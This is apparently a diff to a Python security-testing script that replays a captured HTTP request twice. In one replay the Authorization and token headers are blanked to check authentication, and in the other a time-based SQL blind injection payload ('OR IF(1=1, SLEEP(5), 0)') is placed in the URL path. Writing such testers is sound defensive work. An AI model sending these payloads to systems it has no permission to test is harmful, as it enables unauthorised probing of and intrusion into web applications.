@@ -21,14 +21,18 @@ def extract_request_details_and_send(file_path):
             key, value = line.split(': ', 1)
             headers[key] = value
 
-        # 测试 Authorization 头部为空的场景
+        # 测试 Authorization 或 token 头部为空的场景
         headers_copy = headers.copy()
         if 'Authorization' in headers_copy:
             headers_copy['Authorization'] = ''
+        if 'token' in headers_copy:
+            headers_copy['token'] = ''
+        print("测试场景：验证鉴权判定")
         send_request(request_method, base_url, headers_copy)
 
         # 测试时间盲注的场景
         blind_injection_url = base_url.rsplit('/', 1)[0] + f'/"{base_url.rsplit("/", 1)[1]} OR IF(1=1, SLEEP(5), 0)"'
+        print("测试场景：验证SQL盲注(时间盲注)")
         send_request(request_method, blind_injection_url, headers)
 
 
